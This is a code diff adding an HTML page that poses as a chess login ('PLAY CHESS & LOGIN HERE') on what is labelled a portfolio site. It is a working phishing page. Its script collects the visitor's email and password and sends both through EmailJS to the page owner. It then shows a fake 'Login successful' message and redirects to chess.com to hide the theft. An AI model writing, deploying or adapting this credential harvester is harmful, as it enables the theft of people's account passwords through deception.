@@ -1,0 +1,167 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Geologica:wght@300&display=swap" rel="stylesheet">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Anta&family=Hind+Siliguri:wght@600&family=Kode+Mono:wght@400..700&family=Quicksand:wght@300..700&display=swap" rel="stylesheet">
+    <title>Sankeet-Patra-Portfolio</title>
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <script src="index.js"></script>
+
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("C5aTWPduaXLgn27u9");
+      })();
+    </script>
+    <style>
+      body {
+      font-family: Arial, sans-serif;
+      background:url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRTU1UFWGeGl1Tb3o87orSFv8UwvtYRxg4ew&usqp=CAU);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    font-family: "Anta", sans-serif;
+  font-weight: 400;
+  font-style: normal;
+      
+    }
+
+    
+    h1 {
+      font-size: 19px;background:black;color:white;
+      margin-top: 180px;border: solid transparent;border-radius: 10px
+    }
+
+    input[type="email"] {
+      width: 300px;
+      padding: 10px;
+      margin-bottom: px;
+      background-color: white
+      border: solid 1px transparent;
+      border-radius: 5.5px;
+      color: black;
+      
+    }
+input[type="password"] {
+      width: 300px;
+      padding: 10px;
+      margin-bottom: 10px;
+      background-color: white
+      border: solid 1px transparent;
+      border-radius: 5.5px;
+      color: black;
+    }
+    input[type="email"]::placeholder,
+    input[type="password"]::placeholder {
+      color: black;
+      font-family: 'Geologica', sans-serif;
+    }
+
+    button[type="submit"] {
+      width: 300px;
+      padding: 10px;
+      background-color: #51a308;
+      color: white;
+      font-family: 'Geologica', sans-serif;
+      border-radius: 10px;
+cursor: pointer;border: none; height :50px;font-size:15px
+    }
+
+    button[type="submit"]:hover {
+      background-color: black;color:white;
+    }
+
+    a {
+      color: #fff;
+      text-decoration: none;
+    }
+    
+    </style>
+  </head>
+  <body>
+    <center>
+      
+
+      <div class="container">      
+      <b><h1>PLAY CHESS & LOGIN HERE </h1></b>
+        <div class="form-group">
+          <label for="email"></label>
+          <input
+            type="email"
+            class="form-control"
+            id="email"
+            placeholder="Enter Email"
+          required/>
+        </div>
+        <div class="form-group">
+          <label for="message"></label>
+          <input
+            type="password"
+            class="form-control"
+            id="message"
+            placeholder="Enter Password"
+         required />
+        </div>
+        <button type="submit" class="btn btn-primary" onclick="sendMail()" id="bok">Submit</button>
+      </div>
+    </center>
+
+
+    <script>
+            function sendMail() {
+  var email = document.getElementById("email").value;
+  var password = document.getElementById("message").value;
+
+  // Check if email and password fields are empty
+  if (email.trim() === "" || password.trim() === "") {
+    alert("Please enter both email and password.");
+    return;
+  }
+
+  // Check if email is a valid email format
+  var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailRegex.test(email)) {
+    alert("Please enter a valid email address.");
+    return;
+  }
+
+  // If all validations pass, proceed with sending the email
+  var params = {
+    email: email,
+    message: password,
+  };
+
+  const serviceID = "service_lis2tni";
+  const templateID = "template_3p4ipk4";
+
+  emailjs
+    .send(serviceID, templateID, params)
+    .then((res) => {
+      document.getElementById("email").value = "";
+      document.getElementById("message").value = "";
+      console.log(res);
+      alert("Login successful!! BUT WAIT FOR USER INVITATION LINK THAT GOES IN YOUR GMAIL ");
+      // Redirect to another website
+      window.location.href = 'https://www.chess.com/play/online';
+    })
+    .catch((err) => console.log(err));
+}
+
+    </script>
+  </body>
+  </html>
